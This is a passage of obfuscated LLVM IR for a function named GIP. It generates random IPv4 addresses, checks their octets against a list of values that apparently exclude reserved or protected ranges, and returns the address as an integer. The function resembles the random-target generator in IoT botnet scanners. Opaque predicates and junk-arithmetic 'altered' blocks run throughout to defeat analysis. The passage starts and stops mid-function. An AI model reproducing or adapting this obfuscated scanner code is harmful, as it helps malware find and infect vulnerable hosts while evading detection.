%90 ], [ true, %86 ], [ true, %82 ], [ true, %78 ], [ true, %74 ], [ true, %70 ], [ true, %66 ], [ true, %62 ], [ true, %58 ], [ true, %54 ], [ true, %50 ], [ true, %originalBBpart211 ], [ %5233, %5230 ]
  br i1 %5235, label %5236, label %5265

; <label>:5236:                                   ; preds = %5234
  %5237 = load i32, i32* @x.71
  %5238 = load i32, i32* @y.72
  %5239 = sub i32 %5237, 1
  %5240 = mul i32 %5237, %5239
  %5241 = urem i32 %5240, 2
  %5242 = icmp eq i32 %5241, 0
  %5243 = icmp slt i32 %5238, 10
  %5244 = or i1 %5242, %5243
  br i1 %5244, label %originalBB733, label %originalBB733alteredBB

originalBB733:                                    ; preds = %originalBB733alteredBB, %5236
  %5245 = call i32 @rand() #3
  %5246 = srem i32 %5245, 223
  %5247 = trunc i32 %5246 to i8
  store i8 %5247, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5248 = call i32 @rand() #3
  %5249 = srem i32 %5248, 255
  %5250 = trunc i32 %5249 to i8
  store i8 %5250, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5251 = call i32 @rand() #3
  %5252 = srem i32 %5251, 255
  %5253 = trunc i32 %5252 to i8
  store i8 %5253, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5254 = call i32 @rand() #3
  %5255 = srem i32 %5254, 255
  %5256 = trunc i32 %5255 to i8
  store i8 %5256, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %5257 = load i32, i32* @x.71
  %5258 = load i32, i32* @y.72
  %5259 = sub i32 %5257, 1
  %5260 = mul i32 %5257, %5259
  %5261 = urem i32 %5260, 2
  %5262 = icmp eq i32 %5261, 0
  %5263 = icmp slt i32 %5258, 10
  %5264 = or i1 %5262, %5263
  br i1 %5264, label %originalBBpart2767, label %originalBB733alteredBB

originalBBpart2767:                               ; preds = %originalBB733
  br label %30

; <label>:5265:                                   ; preds = %5234
  %5266 = load i32, i32* @x.71
  %5267 = load i32, i32* @y.72
  %5268 = sub i32 %5266, 1
  %5269 = mul i32 %5266, %5268
  %5270 = urem i32 %5269, 2
  %5271 = icmp eq i32 %5270, 0
  %5272 = icmp slt i32 %5267, 10
  %5273 = or i1 %5271, %5272
  br i1 %5273, label %originalBB769, label %originalBB769alteredBB

originalBB769:                                    ; preds = %originalBB769alteredBB, %5265
  %5274 = bitcast [16 x i8]* %9 to i8*
  call void @llvm.memset.p0i8.i64(i8* %5274, i8 0, i64 16, i32 16, i1 false)
  %5275 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %5276 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5277 = zext i8 %5276 to i32
  %5278 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5279 = zext i8 %5278 to i32
  %5280 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5281 = zext i8 %5280 to i32
  %5282 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  %5283 = zext i8 %5282 to i32
  %5284 = call i32 (i8*, i8*, ...) @szprintf(i8* %5275, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.92, i32 0, i32 0), i32 %5277, i32 %5279, i32 %5281, i32 %5283)
  %5285 = getelementptr inbounds [16 x i8], [16 x i8]* %9, i32 0, i32 0
  %5286 = call i32 @inet_addr(i8* %5285) #3
  %5287 = load i32, i32* @x.71
  %5288 = load i32, i32* @y.72
  %5289 = sub i32 %5287, 1
  %5290 = mul i32 %5287, %5289
  %5291 = urem i32 %5290, 2
  %5292 = icmp eq i32 %5291, 0
  %5293 = icmp slt i32 %5288, 10
  %5294 = or i1 %5292, %5293
  br i1 %5294, label %originalBBpart2771, label %originalBB769alteredBB

originalBBpart2771:                               ; preds = %originalBB769
  ret i32 %5286

originalBBalteredBB:                              ; preds = %originalBB, %0
  %5295 = alloca [16 x i8], align 16
  %5296 = call i32 @rand() #3
  %5297 = srem i32 %5296, 223
  %5298 = trunc i32 %5297 to i8
  store i8 %5298, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5299 = call i32 @rand() #3
  %_ = sub i32 0, %5299
  %gen = add i32 %_, 255
  %_1 = sub i32 0, %5299
  %gen2 = add i32 %_1, 255
  %_3 = shl i32 %5299, 255
  %5300 = srem i32 %5299, 255
  %5301 = trunc i32 %5300 to i8
  store i8 %5301, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5302 = call i32 @rand() #3
  %_4 = sub i32 %5302, 255
  %gen5 = mul i32 %_4, 255
  %5303 = srem i32 %5302, 255
  %5304 = trunc i32 %5303 to i8
  store i8 %5304, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5305 = call i32 @rand() #3
  %_6 = sub i32 0, %5305
  %gen7 = add i32 %_6, 255
  %_8 = shl i32 %5305, 255
  %5306 = srem i32 %5305, 255
  %5307 = trunc i32 %5306 to i8
  store i8 %5307, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 3), align 1
  br label %originalBB

originalBB9alteredBB:                             ; preds = %originalBB9, %30
  %5308 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5309 = zext i8 %5308 to i32
  %5310 = icmp eq i32 %5309, 127
  br label %originalBB9

originalBB13alteredBB:                            ; preds = %originalBB13, %98
  %5311 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5312 = zext i8 %5311 to i32
  %5313 = icmp eq i32 %5312, 21
  br label %originalBB13

originalBB17alteredBB:                            ; preds = %originalBB17, %122
  %5314 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5315 = zext i8 %5314 to i32
  %5316 = icmp eq i32 %5315, 26
  br label %originalBB17

originalBB21alteredBB:                            ; preds = %originalBB21, %146
  %5317 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5318 = zext i8 %5317 to i32
  %5319 = icmp eq i32 %5318, 29
  br label %originalBB21

originalBB25alteredBB:                            ; preds = %originalBB25, %166
  %5320 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5321 = zext i8 %5320 to i32
  %5322 = icmp eq i32 %5321, 30
  br label %originalBB25

originalBB29alteredBB:                            ; preds = %originalBB29, %226
  %5323 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5324 = zext i8 %5323 to i32
  %5325 = icmp eq i32 %5324, 146
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %270
  %5326 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5327 = zext i8 %5326 to i32
  %5328 = icmp eq i32 %5327, 114
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %306
  %5329 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5330 = zext i8 %5329 to i32
  %5331 = icmp eq i32 %5330, 150
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %326
  %5332 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5333 = zext i8 %5332 to i32
  %5334 = icmp eq i32 %5333, 144
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %346
  %5335 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5336 = zext i8 %5335 to i32
  %5337 = icmp eq i32 %5336, 150
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %398
  %5338 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5339 = zext i8 %5338 to i32
  %5340 = icmp eq i32 %5339, 196
  br label %originalBB49

originalBB53alteredBB:                            ; preds = %originalBB53, %426
  %5341 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5342 = zext i8 %5341 to i32
  %5343 = icmp eq i32 %5342, 152
  br label %originalBB53

originalBB57alteredBB:                            ; preds = %originalBB57, %446
  %5344 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5345 = zext i8 %5344 to i32
  %5346 = icmp eq i32 %5345, 229
  br label %originalBB57

originalBB61alteredBB:                            ; preds = %originalBB61, %482
  %5347 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5348 = zext i8 %5347 to i32
  %5349 = icmp eq i32 %5348, 161
  br label %originalBB61

originalBB65alteredBB:                            ; preds = %originalBB65, %506
  %5350 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5351 = zext i8 %5350 to i32
  %5352 = icmp eq i32 %5351, 162
  br label %originalBB65

originalBB69alteredBB:                            ; preds = %originalBB69, %546
  %5353 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5354 = zext i8 %5353 to i32
  %5355 = icmp eq i32 %5354, 155
  br label %originalBB69

originalBB73alteredBB:                            ; preds = %originalBB73, %570
  %5356 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5357 = zext i8 %5356 to i32
  %5358 = icmp eq i32 %5357, 155
  br label %originalBB73

originalBB77alteredBB:                            ; preds = %originalBB77, %598
  %5359 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5360 = zext i8 %5359 to i32
  %5361 = icmp eq i32 %5360, 158
  br label %originalBB77

originalBB81alteredBB:                            ; preds = %originalBB81, %626
  %5362 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5363 = zext i8 %5362 to i32
  %5364 = icmp eq i32 %5363, 167
  br label %originalBB81

originalBB85alteredBB:                            ; preds = %originalBB85, %646
  %5365 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5366 = zext i8 %5365 to i32
  %5367 = icmp eq i32 %5366, 44
  br label %originalBB85

originalBB89alteredBB:                            ; preds = %originalBB89, %698
  %5368 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5369 = zext i8 %5368 to i32
  %5370 = icmp eq i32 %5369, 204
  br label %originalBB89

originalBB93alteredBB:                            ; preds = %originalBB93, %726
  %5371 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5372 = zext i8 %5371 to i32
  %5373 = icmp eq i32 %5372, 30
  br label %originalBB93

originalBB97alteredBB:                            ; preds = %originalBB97, %766
  %5374 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5375 = zext i8 %5374 to i32
  %5376 = icmp eq i32 %5375, 235
  br label %originalBB97

originalBB101alteredBB:                           ; preds = %originalBB101, %794
  %5377 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5378 = zext i8 %5377 to i32
  %5379 = icmp eq i32 %5378, 209
  br label %originalBB101

originalBB105alteredBB:                           ; preds = %originalBB105, %826
  %5380 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5381 = zext i8 %5380 to i32
  %5382 = icmp eq i32 %5381, 172
  br label %originalBB105

originalBB109alteredBB:                           ; preds = %originalBB109, %854
  %5383 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5384 = zext i8 %5383 to i32
  %5385 = icmp eq i32 %5384, 100
  br label %originalBB109

originalBB113alteredBB:                           ; preds = %originalBB113, %878
  %5386 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5387 = zext i8 %5386 to i32
  %5388 = icmp slt i32 %5387, 127
  br label %originalBB113

originalBB117alteredBB:                           ; preds = %originalBB117, %906
  %5389 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5390 = zext i8 %5389 to i32
  %5391 = icmp eq i32 %5390, 198
  br label %originalBB117

originalBB121alteredBB:                           ; preds = %originalBB121, %982
  %5392 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5393 = zext i8 %5392 to i32
  %5394 = icmp eq i32 %5393, 131
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %1010
  %5395 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5396 = zext i8 %5395 to i32
  %5397 = icmp eq i32 %5396, 132
  br label %originalBB125

originalBB129alteredBB:                           ; preds = %originalBB129, %1030
  %5398 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5399 = zext i8 %5398 to i32
  %5400 = icmp sge i32 %5399, 3
  br label %originalBB129

originalBB133alteredBB:                           ; preds = %originalBB133, %1054
  %5401 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5402 = zext i8 %5401 to i32
  %5403 = icmp eq i32 %5402, 134
  br label %originalBB133

originalBB137alteredBB:                           ; preds = %originalBB137, %1078
  %5404 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5405 = zext i8 %5404 to i32
  %5406 = icmp slt i32 %5405, 235
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %1102
  %5407 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5408 = zext i8 %5407 to i32
  %5409 = icmp sge i32 %5408, 177
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %1122
  %5410 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5411 = zext i8 %5410 to i32
  %5412 = icmp slt i32 %5411, 223
  br label %originalBB145

originalBB149alteredBB:                           ; preds = %originalBB149, %1142
  %5413 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5414 = zext i8 %5413 to i32
  %5415 = icmp eq i32 %5414, 138
  br label %originalBB149

originalBB153alteredBB:                           ; preds = %originalBB153, %1162
  %5416 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5417 = zext i8 %5416 to i32
  %5418 = icmp sge i32 %5417, 13
  br label %originalBB153

originalBB157alteredBB:                           ; preds = %originalBB157, %1186
  %5419 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5420 = zext i8 %5419 to i32
  %5421 = icmp eq i32 %5420, 139
  br label %originalBB157

originalBB161alteredBB:                           ; preds = %originalBB161, %1206
  %5422 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5423 = zext i8 %5422 to i32
  %5424 = icmp sge i32 %5423, 31
  br label %originalBB161

originalBB165alteredBB:                           ; preds = %originalBB165, %1234
  %5425 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5426 = zext i8 %5425 to i32
  %5427 = icmp sge i32 %5426, 1
  br label %originalBB165

originalBB169alteredBB:                           ; preds = %originalBB169, %1262
  %5428 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5429 = zext i8 %5428 to i32
  %5430 = icmp sge i32 %5429, 45
  br label %originalBB169

originalBB173alteredBB:                           ; preds = %originalBB173, %1294
  %5431 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5432 = zext i8 %5431 to i32
  %5433 = icmp slt i32 %5432, 253
  br label %originalBB173

originalBB177alteredBB:                           ; preds = %originalBB177, %1318
  %5434 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5435 = zext i8 %5434 to i32
  %5436 = icmp sge i32 %5435, 165
  br label %originalBB177

originalBB181alteredBB:                           ; preds = %originalBB181, %1342
  %5437 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5438 = zext i8 %5437 to i32
  %5439 = icmp eq i32 %5438, 147
  br label %originalBB181

originalBB185alteredBB:                           ; preds = %originalBB185, %1366
  %5440 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5441 = zext i8 %5440 to i32
  %5442 = icmp slt i32 %5441, 43
  br label %originalBB185

originalBB189alteredBB:                           ; preds = %originalBB189, %1390
  %5443 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5444 = zext i8 %5443 to i32
  %5445 = icmp sge i32 %5444, 103
  br label %originalBB189

originalBB193alteredBB:                           ; preds = %originalBB193, %1410
  %5446 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5447 = zext i8 %5446 to i32
  %5448 = icmp slt i32 %5447, 105
  br label %originalBB193

originalBB197alteredBB:                           ; preds = %originalBB197, %1430
  %5449 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5450 = zext i8 %5449 to i32
  %5451 = icmp eq i32 %5450, 147
  br label %originalBB197

originalBB201alteredBB:                           ; preds = %originalBB201, %1462
  %5452 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5453 = zext i8 %5452 to i32
  %5454 = icmp sge i32 %5453, 198
  br label %originalBB201

originalBB205alteredBB:                           ; preds = %originalBB205, %1498
  %5455 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5456 = zext i8 %5455 to i32
  %5457 = icmp eq i32 %5456, 150
  br label %originalBB205

originalBB209alteredBB:                           ; preds = %originalBB209, %1522
  %5458 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5459 = zext i8 %5458 to i32
  %5460 = icmp slt i32 %5459, 115
  br label %originalBB209

originalBB213alteredBB:                           ; preds = %originalBB213, %1542
  %5461 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5462 = zext i8 %5461 to i32
  %5463 = icmp eq i32 %5462, 152
  br label %originalBB213

originalBB217alteredBB:                           ; preds = %originalBB217, %1570
  %5464 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5465 = zext i8 %5464 to i32
  %5466 = icmp eq i32 %5465, 153
  br label %originalBB217

originalBB221alteredBB:                           ; preds = %originalBB221, %1590
  %5467 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5468 = zext i8 %5467 to i32
  %5469 = icmp sge i32 %5468, 21
  br label %originalBB221

originalBB225alteredBB:                           ; preds = %originalBB225, %1626
  %5470 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5471 = zext i8 %5470 to i32
  %5472 = icmp eq i32 %5471, 155
  br label %originalBB225

originalBB229alteredBB:                           ; preds = %originalBB229, %1670
  %5473 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5474 = zext i8 %5473 to i32
  %5475 = icmp sge i32 %5474, 150
  br label %originalBB229

originalBB233alteredBB:                           ; preds = %originalBB233, %1702
  %5476 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5477 = zext i8 %5476 to i32
  %5478 = icmp slt i32 %5477, 21
  br label %originalBB233

originalBB237alteredBB:                           ; preds = %originalBB237, %1746
  %5479 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5480 = zext i8 %5479 to i32
  %5481 = icmp eq i32 %5480, 160
  br label %originalBB237

originalBB241alteredBB:                           ; preds = %originalBB241, %1794
  %5482 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5483 = zext i8 %5482 to i32
  %5484 = icmp slt i32 %5483, 47
  br label %originalBB241

originalBB245alteredBB:                           ; preds = %originalBB245, %1814
  %5485 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5486 = zext i8 %5485 to i32
  %5487 = icmp eq i32 %5486, 163
  br label %originalBB245

originalBB249alteredBB:                           ; preds = %originalBB249, %1834
  %5488 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5489 = zext i8 %5488 to i32
  %5490 = icmp sge i32 %5489, 205
  br label %originalBB249

originalBB253alteredBB:                           ; preds = %originalBB253, %1854
  %5491 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5492 = zext i8 %5491 to i32
  %5493 = icmp slt i32 %5492, 207
  br label %originalBB253

originalBB257alteredBB:                           ; preds = %originalBB257, %1906
  %5494 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5495 = zext i8 %5494 to i32
  %5496 = icmp slt i32 %5495, 254
  br label %originalBB257

originalBB261alteredBB:                           ; preds = %originalBB261, %1926
  %5497 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5498 = zext i8 %5497 to i32
  %5499 = icmp eq i32 %5498, 199
  br label %originalBB261

originalBB265alteredBB:                           ; preds = %originalBB265, %1954
  %5500 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5501 = zext i8 %5500 to i32
  %5502 = icmp eq i32 %5501, 205
  br label %originalBB265

originalBB269alteredBB:                           ; preds = %originalBB269, %1982
  %5503 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5504 = zext i8 %5503 to i32
  %5505 = icmp eq i32 %5504, 207
  br label %originalBB269

originalBB273alteredBB:                           ; preds = %originalBB273, %2002
  %5506 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5507 = zext i8 %5506 to i32
  %5508 = icmp sge i32 %5507, 60
  br label %originalBB273

originalBB277alteredBB:                           ; preds = %originalBB277, %2022
  %5509 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5510 = zext i8 %5509 to i32
  %5511 = icmp slt i32 %5510, 62
  br label %originalBB277

originalBB281alteredBB:                           ; preds = %originalBB281, %2066
  %5512 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5513 = zext i8 %5512 to i32
  %5514 = icmp eq i32 %5513, 226
  br label %originalBB281

originalBB285alteredBB:                           ; preds = %originalBB285, %2130
  %5515 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5516 = zext i8 %5515 to i32
  %5517 = icmp eq i32 %5516, 236
  br label %originalBB285

originalBB289alteredBB:                           ; preds = %originalBB289, %2154
  %5518 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5519 = zext i8 %5518 to i32
  %5520 = icmp eq i32 %5519, 170
  br label %originalBB289

originalBB293alteredBB:                           ; preds = %originalBB293, %2174
  %5521 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5522 = zext i8 %5521 to i32
  %5523 = icmp eq i32 %5522, 138
  br label %originalBB293

originalBB297alteredBB:                           ; preds = %originalBB297, %2206
  %5524 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5525 = zext i8 %5524 to i32
  %5526 = icmp eq i32 %5525, 139
  br label %originalBB297

originalBB301alteredBB:                           ; preds = %originalBB301, %2226
  %5527 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5528 = zext i8 %5527 to i32
  %5529 = icmp eq i32 %5528, 59
  br label %originalBB301

originalBB305alteredBB:                           ; preds = %originalBB305, %2246
  %5530 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5531 = zext i8 %5530 to i32
  %5532 = icmp eq i32 %5531, 146
  br label %originalBB305

originalBB309alteredBB:                           ; preds = %originalBB309, %2270
  %5533 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5534 = zext i8 %5533 to i32
  %5535 = icmp sge i32 %5534, 128
  br label %originalBB309

originalBB313alteredBB:                           ; preds = %originalBB313, %2290
  %5536 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5537 = zext i8 %5536 to i32
  %5538 = icmp slt i32 %5537, 191
  br label %originalBB313

originalBB317alteredBB:                           ; preds = %originalBB317, %2310
  %5539 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5540 = zext i8 %5539 to i32
  %5541 = icmp eq i32 %5540, 163
  br label %originalBB317

originalBB321alteredBB:                           ; preds = %originalBB321, %2330
  %5542 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5543 = zext i8 %5542 to i32
  %5544 = icmp eq i32 %5543, 47
  br label %originalBB321

originalBB325alteredBB:                           ; preds = %originalBB325, %2370
  %5545 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5546 = zext i8 %5545 to i32
  %5547 = icmp slt i32 %5546, 127
  br label %originalBB325

originalBB329alteredBB:                           ; preds = %originalBB329, %2422
  %5548 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5549 = zext i8 %5548 to i32
  %5550 = icmp eq i32 %5549, 198
  br label %originalBB329

originalBB333alteredBB:                           ; preds = %originalBB333, %2450
  %5551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5552 = zext i8 %5551 to i32
  %5553 = icmp slt i32 %5552, 127
  br label %originalBB333

originalBB337alteredBB:                           ; preds = %originalBB337, %2498
  %5554 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5555 = zext i8 %5554 to i32
  %5556 = icmp slt i32 %5555, 31
  br label %originalBB337

originalBB341alteredBB:                           ; preds = %originalBB341, %2522
  %5557 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5558 = zext i8 %5557 to i32
  %5559 = icmp eq i32 %5558, 207
  br label %originalBB341

originalBB345alteredBB:                           ; preds = %originalBB345, %2566
  %5560 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %5561 = zext i8 %5560 to i32
  %5562 = icmp eq i32 %5561, 80
  br label %originalBB345

originalBB349alteredBB:                           ; preds = %originalBB349, %2586
  %5563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %5564 = zext i8 %5563 to i32
  %5565 = icmp eq i32 %5564, 240
  br label %originalBB349

originalBB353alteredBB:                           ; preds = %originalBB353, %2642
  %5566 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 2), align 1
  %5567 = zext i8 %5566 to i32
  %5568 = icmp slt i32 %5567, 63
  br label %originalBB353

originalBB357alteredBB:                           ; preds = %originalBB357, %2666
